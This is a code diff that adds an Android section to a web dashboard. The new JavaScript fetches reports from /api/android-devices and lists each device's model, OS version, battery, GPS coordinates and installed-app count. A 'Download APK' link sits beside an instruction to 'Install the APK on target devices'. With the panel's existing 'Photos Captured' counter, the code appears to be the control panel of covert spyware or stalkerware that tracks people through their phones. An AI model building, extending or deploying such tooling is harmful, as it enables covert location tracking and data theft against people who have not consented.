@@ -243,9 +243,7 @@ body {
 .glow-orange { background: #f59e0b; }
 .glow-rose { background: #f43f5e; }
 .glow-amber { background: #f59e0b; }
-.glow-green { background: #10b981; }
-.glow-blue { background: #3b82f6; }
-.glow-purple { background: #8b5cf6; }
+.glow-cyan { background: #06b6d4; }
 
 .stat-icon {
   position: relative;
@@ -911,6 +909,11 @@ tbody tr:hover td { background: rgba(255,255,255,0.02); }
       Photos
       <span class="count-badge" id="sidebarPhotoCount">0</span>
     </button>
+    <button class="sidebar-item" data-section="android" onclick="switchSection('android')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/><path d="M9 10l-2 4"/><path d="M15 10l2 4"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
+      Android
+      <span class="count-badge" id="sidebarAndroidCount">0</span>
+    </button>
   </nav>
 
   <div class="sidebar-footer">
@@ -1001,6 +1004,21 @@ tbody tr:hover td { background: rgba(255,255,255,0.02); }
         </div>
         <div class="stat-value" id="totalPhotos">—</div>
         <div class="stat-label">Photos Captured</div>
+        </div>
+        <div class="stat-card">
+        <div class="glow-orb glow-cyan"></div>
+        <div class="stat-icon icon-bg-green">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" stroke-width="1.5"/>
+            <circle cx="12" cy="10" r="3" stroke-width="1.5"/>
+            <path d="M9 10l-2 4" stroke-width="1.5"/>
+            <path d="M15 10l2 4" stroke-width="1.5"/>
+            <line x1="9" y1="15" x2="15" y2="15" stroke-width="1.5"/>
+            <circle cx="12" cy="20" r="1" fill="currentColor" opacity="0.5"/>
+          </svg>
+        </div>
+        <div class="stat-value" id="totalAndroid"><span class="prefix">📱</span> <span id="totalAndroidCount">—</span></div>
+        <div class="stat-label">Android Devices</div>
         </div>
         <div class="stat-card">
         <div class="glow-orb glow-rose"></div>
@@ -1228,6 +1246,45 @@ tbody tr:hover td { background: rgba(255,255,255,0.02); }
     </div>
   </div>
 
+  <!-- Section: Android Devices -->
+  <div class="main-content section-content" id="sec-android">
+    <div class="section">
+      <div class="section-header">
+        <div class="section-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/><path d="M9 10l-2 4"/><path d="M15 10l2 4"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
+          Android Device Reports
+          <span class="section-count" id="androidCountHeader">0</span>
+        </div>
+        <a href="/apk/download" class="section-action">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Download APK
+        </a>
+      </div>
+      <div class="card">
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Device ID</th>
+                <th>Model</th>
+                <th>Android</th>
+                <th>Battery</th>
+                <th>Location</th>
+                <th>Apps</th>
+                <th>Reported</th>
+              </tr>
+            </thead>
+            <tbody id="androidBody">
+              <tr><td colspan="7" class="loading-row">
+                <div class="loading-spinner"><div class="spinner"></div> Loading device reports...</div>
+              </td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- Footer -->
   <footer class="footer" style="margin-left:240px">
     <div class="footer-inner">
@@ -1319,10 +1376,12 @@ function render(data) {
   animateCount(document.getElementById('todayEvents'), data.today_events || 0);
   animateCount(document.getElementById('totalPhotos'), data.total_photos || 0);
   animateCount(document.getElementById('totalUsers'), data.total_users || 0);
+  animateCount(document.getElementById('totalAndroidCount'), data.total_android || 0);
 
   document.getElementById('eventCount').textContent = data.total_events || 0;
   document.getElementById('linkCount').textContent = data.total_links || 0;
   document.getElementById('photoCountHeader').textContent = data.total_photos || 0;
+  document.getElementById('androidCountHeader').textContent = data.total_android || 0;
 
   // Sidebar badges
   const se = document.getElementById('sidebarEventCount');
@@ -1331,6 +1390,8 @@ function render(data) {
   if (sl) sl.textContent = data.total_links || 0;
   const sp = document.getElementById('sidebarPhotoCount');
   if (sp) sp.textContent = data.total_photos || 0;
+  const sa = document.getElementById('sidebarAndroidCount');
+  if (sa) sa.textContent = data.total_android || 0;
 
   document.getElementById('footerStatus').textContent = '● Live';
   if (data.generated_at) {
@@ -1420,6 +1481,61 @@ function render(data) {
     </div>`;
   }
   renderPhotos(data);
+  renderAndroidDevices();
+}
+
+// ── Android Devices ──
+let androidDataCache = [];
+async function renderAndroidDevices() {
+  try {
+    const resp = await fetch(`/api/android-devices?token=${TOKEN}`);
+    if (!resp.ok) return;
+    const data = await resp.json();
+    const devices = data.devices || [];
+    androidDataCache = devices;
+    const body = document.getElementById('androidBody');
+    if (!body) return;
+    if (devices.length === 0) {
+      body.innerHTML = `<tr><td colspan="7" class="empty-data">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+        <p>No Android devices reported</p>
+        <div class="sub">Install the APK on target devices to see reports here</div>
+      </td></tr>`;
+      return;
+    }
+    body.innerHTML = devices.map(d => {
+      const report = d.data;
+      const device = report.device || {};
+      const loc = report.location || {};
+      const battery = report.battery || {};
+      const apps = report.installed_apps || [];
+      const model = [device.manufacturer, device.model].filter(Boolean).join(' ') || 'Unknown';
+      const androidVer = device.android_version || '?';
+      const battPct = battery.percentage !== undefined ? Math.round(battery.percentage) + '%' : '—';
+      const latLng = loc.lat ? `${Number(loc.lat).toFixed(4)}, ${Number(loc.lng).toFixed(4)}` : '—';
+      return `<tr>
+        <td><span class="td-id"><span class="hash">🤖</span>${(d.device_id || '?').slice(0,12)}…</span></td>
+        <td class="td-name">${escHtml(model)}</td>
+        <td><span class="td-acc">🤖 ${escHtml(androidVer)}</span></td>
+        <td>${battPct}</td>
+        <td class="td-coords">${latLng}</td>
+        <td><span class="td-acc" style="font-weight:600;color:var(--accent-blue)">${apps.length}</span></td>
+        <td class="td-time">${(d.timestamp || '').slice(0,19) || '-'}</td>
+      </tr>`;
+    }).join('');
+  } catch (e) {
+    console.error('Android fetch error:', e);
+  }
+}
+function escHtml(s) {
+  if (!s) return '';
+  return String(s).replace(/[&<>"']/g, function(m) {
+    if (m === '&') return '&amp;';
+    if (m === '<') return '&lt;';
+    if (m === '>') return '&gt;';
+    if (m === '"') return '&quot;';
+    return '&#39;';
+  });
 }
 
 // ── Photo Grid ──
